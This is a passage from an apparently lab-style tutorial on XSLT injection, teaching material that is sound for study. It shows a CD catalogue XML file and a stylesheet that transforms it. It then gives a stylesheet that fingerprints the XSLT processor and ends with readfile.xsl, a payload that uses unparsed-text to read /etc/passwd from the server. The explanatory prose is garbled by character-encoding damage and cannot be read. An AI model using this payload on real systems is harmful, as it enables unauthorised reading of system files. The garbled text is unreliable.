class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Romanza<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Andrea Bocelli<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Polydor<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.80<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1996<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>When a man loves a woman<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Percy Sledge<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Atlantic<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.70<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Black angel<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Savage Rose<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Mega<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1995<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>1999 Grammy Nominees<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Many<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Grammy<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>10.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1999<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>For the good times<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Kenny Rogers<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Mucik Master<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.70<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1995<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Big Willie style<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Will Smith<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Columbia<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1997<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Tupelo Honey<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Van Morrison<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Polydor<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1971<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Soulsville<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Jorn Hoel<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>Norway<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>WEA<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1996<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The very best of<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Cat Stevens<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Island<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1990<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Stop<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Sam Brown<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>A and M<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1988<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bridge of Spies<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>T`Pau<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Siren<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Private Dancer<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Tina Turner<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Capitol<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1983<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Midt om natten<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Kim Larsen<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Medley<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.80<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1983<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Pavarotti Gala Concert<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Luciano Pavarotti<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>DECCA<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>9.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1991<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The dock of the bay<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Otis Redding<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Stax Records<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.90<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1968<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Picture book<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Simply Red<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>EU<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>Elektra<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1985<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Red<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>The Communards<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>London<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>7.80<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cd</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Unchain my heart<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artist</span>&gt;</span>Joe Cocker<span class="tag">&lt;/<span class="name">artist</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">country</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">country</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">company</span>&gt;</span>EMI<span class="tag">&lt;/<span class="name">company</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">price</span>&gt;</span>8.20<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">year</span>&gt;</span>1987<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">cd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="transformation-xsl"><a href="#transformation-xsl" class="headerlink" title="transformation.xsl"></a>transformation.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span></span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>My CD Collection<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Artist<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"catalog/cd/title"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"catalog/cd/artist"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬éœ€è¦ç†è§£XMLæ ¼å¼ä»¥äº†è§£è½¬æ¢æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚</p>
<ul>
<li>ç¬¬ä¸€è¡Œé€šå¸¸æ˜¯XMLç‰ˆæœ¬å’Œç¼–ç </li>
<li>æ¥ä¸‹æ¥ï¼Œå®ƒå°†æ‹¥æœ‰XSLæ ¹èŠ‚ç‚¹<code>xsl:stylesheet</code></li>
<li>ç„¶åï¼Œæˆ‘ä»¬å°†åœ¨<code>xsl:template match="&lt;PATH&gt;"</code>ä¸­è·å¾—æŒ‡ä»¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒå°†é€‚ç”¨äºä»»ä½•XMLèŠ‚ç‚¹ã€‚</li>
<li>ä¹‹åï¼Œå°†ä¸ºXMLç»“æ„ä¸­ä¸å‰ä¸€è¡ŒåŒ¹é…çš„ä»»ä½•é¡¹å®šä¹‰è½¬æ¢ã€‚</li>
<li>è¦ä»XMLæ–‡æ¡£ä¸­é€‰æ‹©æŸäº›é¡¹ç›®ï¼ŒXPATHè¯­è¨€ä»¥<code>&lt;xsl:value-of select="&lt;NODE&gt;/&lt;SUBNODE&gt;/&lt;VALUE&gt;"/&gt;</code>çš„å½¢å¼ä½¿ç”¨ã€‚</li>
</ul>
<p>è¦æŸ¥çœ‹ç»“æœï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å‘½ä»¤è¡Œè§£æå™¨ã€‚è¿™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°ï¼š</p>
<h4 id="Transformation-through-the-terminal"><a href="#Transformation-through-the-terminal" class="headerlink" title="Transformation through the terminal"></a>Transformation through the terminal</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:transformation.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 3 column 50 of transformation.xslt:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">      &lt;h2&gt;My CD Collection&lt;/h2&gt;</span><br><span class="line">      &lt;table border="1"&gt;</span><br><span class="line">         &lt;tr bgcolor="#9acd32"&gt;</span><br><span class="line">            &lt;th&gt;Title&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Artist&lt;/th&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">         &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Empire Burlesque&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Bob Dylan&lt;/td&gt;</span><br><span class="line">         &lt;/tr&gt;</span><br><span class="line">      &lt;/table&gt;</span><br><span class="line">   &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>ä¸‹é¢çš„æ–‡ä»¶å¯ç”¨äºæ£€æµ‹åº•å±‚é¢„å¤„ç†å™¨ã€‚</p>
<h4 id="detection-xsl"><a href="#detection-xsl" class="headerlink" title="detection.xsl"></a>detection.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">"html"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSLT identification<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>Version:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:version')"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>Vendor:<span class="tag">&lt;/<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>Vendor URL:<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"system-property('xsl:vendor-url')"</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨è®©æˆ‘ä»¬è¿è¡Œå‰é¢çš„å‘½ä»¤ï¼Œä½†è¿™ä¸€æ¬¡ä½¿ç”¨detection.xslæ–‡ä»¶ã€‚</p>
<h4 id="Transformation-through-the-terminal-1"><a href="#Transformation-through-the-terminal-1" class="headerlink" title="Transformation through the terminal"></a>Transformation through the terminal</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ saxonb-xslt -xsl:detection.xsl catalogue.xml</span><br><span class="line"></span><br><span class="line">Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:</span><br><span class="line">  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor</span><br><span class="line">&lt;h2&gt;XSLT identification&lt;/h2&gt;&lt;b&gt;Version:&lt;/b&gt;2.0&lt;br&gt;&lt;b&gt;Vendor:&lt;/b&gt;SAXON 9.1.0.8 from Saxonica&lt;br&gt;&lt;b&gt;Vendor URL:&lt;/b&gt;http://www.saxonica.com/&lt;br&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>åŸºäºé¢„å¤„ç†å™¨ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹æ­¤ç‰ˆæœ¬çš„JavaScriptæ–‡æ¡£ï¼Œä»¥ç¡®å®šæ„Ÿå…´è¶£çš„å‡½æ•°ï¼Œä¾‹å¦‚ä»¥ä¸‹å‡½æ•°ã€‚</p>
<ul>
<li><code>unparsed-text</code>å¯ä»¥ç”¨æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</li>
</ul>
<h4 id="readfile-xsl"><a href="#readfile-xsl" class="headerlink" title="readfile.xsl"></a>readfile.xsl</h4><p>Code: </p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span> <span class="attr">xmlns:abc</span>=<span class="string">"http://php.net/xsl"</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"unparsed-text('/etc/passwd', 'utf-8')"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

